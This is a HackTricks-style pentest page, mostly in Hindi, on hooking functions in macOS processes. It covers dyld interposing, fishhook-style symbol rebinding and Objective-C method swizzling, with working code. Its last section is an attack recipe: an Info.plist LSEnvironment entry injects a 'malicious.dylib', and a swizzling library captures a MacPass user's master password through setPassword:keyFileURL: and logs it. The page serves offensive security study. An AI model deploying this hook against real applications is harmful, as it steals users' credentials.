# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

एक **dylib** बनाएँ जिसमें **`__interpose` (`__DATA___interpose`)** section (या **`S_INTERPOSING`** flag वाला section) हो, जिसमें **function pointers** के tuples हों जो **original** और **replacement** functions को refer करते हों।

फिर, **`DYLD_INSERT_LIBRARIES`** का उपयोग करके dylib को **inject** करें (interposing मुख्य app के load होने से पहले होना आवश्यक है)। स्पष्ट रूप से, यहां भी **`DYLD_INSERT_LIBRARIES`** के उपयोग पर लागू [**restrictions** लागू होती हैं](macos-library-injection/index.html#check-restrictions)।

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable का उपयोग interposing को debug करने के लिए किया जा सकता है और यह interpose process को print करेगा।

यह भी ध्यान दें कि **interposing process और loaded libraries के बीच होता है**, यह shared library cache के साथ काम नहीं करता।

### Dynamic Interposing

अब **`dyld_dynamic_interpose`** function का उपयोग करके किसी function को dynamically interpose करना भी संभव है। इससे किसी function को केवल **beginning** से करने के बजाय **runtime** में **programmatically** interpose किया जा सकता है।

इसके लिए केवल **replace किए जाने वाले function और replacement** function के **tuples** को indicate करना आवश्यक है।
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

यदि आपके पास पहले से ही **process के अंदर** code execution है और आप target को relaunch किए बिना किसी **imported C function** को hook करना चाहते हैं, तो एक बहुत सामान्य primitive **symbol rebinding** है, जिसे **`fishhook`** ने popularise किया।

**`__interpose`** section का उपयोग करने के बजाय, यह technique Mach-O metadata (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) को traverse करती है और current image द्वारा उपयोग किए जाने वाले **import slot** को **overwrite** कर देती है। यह किसी **already-running** process में functions को hook करने या **`rebind_symbols_image`** के साथ **सिर्फ एक image** को hook करने के लिए बहुत उपयोगी है।<sup>[[2]](#references)</sup>

> [!TIP]
> यह केवल उन calls को प्रभावित करता है जो वास्तव में किसी **import pointer** के माध्यम से जाती हैं। यदि target function को **same image** के अंदर सीधे call किया जाता है, तो rewrite करने के लिए कोई imported slot नहीं होता, इसलिए यह technique उस call site को नहीं देखेगी।
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
हाल के macOS versions में कई rebinding targets अब writable **`__DATA`** pages में नहीं होते। Pointer को patch करने से पहले Rebinders को आमतौर पर **`__DATA_CONST`** को अस्थायी रूप से writable बनाना पड़ता है। इसके अलावा, Apple Silicon / **`arm64e`** पर आपको **`__AUTH_CONST.__auth_got`** में authenticated pointers और extra indirection की अपेक्षा करनी चाहिए, इसलिए ऐसा rebinder जो केवल classic lazy/non-lazy symbol pointer sections को scan करता है, कुछ call sites को miss कर सकता है।<sup>[[3]](#references)</sup>

> [!CAUTION]
> **`arm64e`** ABI कई function pointers के लिए **Pointer Authentication (PAC)** का उपयोग करता है। Intel पर काम करने वाले blind pointer writes Apple Silicon पर किसी call site को तोड़ सकते हैं। अपना rebinder या inline hooker लिखते समय **`<ptrauth.h>`** के helpers, जैसे **`ptrauth_sign_unauthenticated`** या **`ptrauth_auth_and_resign`**, का उपयोग करने के लिए तैयार रहें और विशेष रूप से **`arm64e`** targets पर test करें।

**`__AUTH`**, **`__AUTH_CONST`** और **`__auth_got`** के बारे में अधिक जानकारी के लिए [इस page](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md) को देखें।

## Method Swizzling

ObjectiveC में किसी method को इस तरह call किया जाता है: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

इसके लिए **object**, **method** और **params** आवश्यक होते हैं। जब कोई method call किया जाता है, तो function **`objc_msgSend`** का उपयोग करके एक **msg भेजा जाता है**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object **`someObject`** है, method **`@selector(method1p1:p2:)`** है और arguments **value1**, **value2** हैं।

Object structures को follow करके ऐसे **array of methods** तक पहुँचना संभव है, जहाँ methods के **names** और method code के **pointers** **located** होते हैं।<sup>[[1]](#references)</sup>

> [!CAUTION]
> ध्यान दें कि methods और classes को उनके names के आधार पर access किया जाता है, इसलिए यह information binary में stored होती है। इसे `otool -ov </path/bin>` या [`class-dump </path/bin>`](https://github.com/nygard/class-dump) से retrieve करना संभव है।

### Accessing the raw methods

निम्नलिखित example की तरह methods की information, जैसे name, params की संख्या या address, access करना संभव है।
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

The function **`method_exchangeImplementations`** **एक function के implementation का address दूसरे function के implementation के address से बदलने** की अनुमति देता है।

> [!CAUTION]
> इसलिए जब किसी function को call किया जाता है, तो **दूसरा function execute होता है**।
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> इस मामले में यदि **legit** method का **implementation code** **method** के **name** को **verify** करता है, तो यह इस swizzling को **detect** कर सकता है और इसे चलने से रोक सकता है।
>
> निम्नलिखित technique पर यह restriction लागू नहीं है।

### method_setImplementation के साथ Method Swizzling

पिछला format अजीब है, क्योंकि इसमें आप 2 methods के implementations को एक-दूसरे से बदल रहे हैं। **`method_setImplementation`** function का उपयोग करके आप किसी **method** के **implementation** को दूसरे method के **implementation** से **change** कर सकते हैं।

बस यह याद रखें कि original method के implementation का address **store** कर लें, यदि आप उसे नए implementation से call करने वाले हैं। उसे overwrite करने से पहले ऐसा करें, क्योंकि बाद में उस address को locate करना बहुत अधिक complicated होगा।
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

इस page में functions को hook करने के अलग-अलग तरीकों पर चर्चा की गई है। हालांकि, इनमें **attack किए जाने वाले process के अंदर code चलाना** शामिल था।

ऐसा करने के लिए सबसे आसान technique [environment variables के माध्यम से Dyld inject करना या hijacking करना](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) है। हालांकि, मेरा मानना है कि यह [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) के माध्यम से भी किया जा सकता है।

हालांकि, दोनों options केवल **unprotected** binaries/processes तक **सीमित** हैं। Limitations के बारे में अधिक जानने के लिए प्रत्येक technique देखें।

हालांकि, function hooking attack बहुत specific होता है। attacker ऐसा **किसी process के अंदर से sensitive information चुराने के लिए** करेगा (यदि ऐसा नहीं है, तो आप केवल process injection attack करेंगे)। और यह sensitive information user द्वारा downloaded Apps, जैसे MacPass, में स्थित हो सकती है।

इसलिए attacker vector या तो कोई vulnerability ढूंढना होगा या application की signature strip करनी होगी, फिर application के Info.plist के माध्यम से **`DYLD_INSERT_LIBRARIES`** env variable inject करके कुछ इस तरह जोड़ना होगा:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
और फिर **application को पुनः register करें**:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
उस library में information exfiltrate करने के लिए hooking code जोड़ें: Passwords, messages...

> [!CAUTION]
> ध्यान दें कि macOS के नए versions में, यदि आप application binary की **signature को strip** करते हैं और उसे पहले execute किया जा चुका है, तो macOS अब उस application को **execute नहीं करेगा**।

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## References

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: A library that simplifies the process of dynamically rebinding symbols in Mach-O binaries](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication — Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
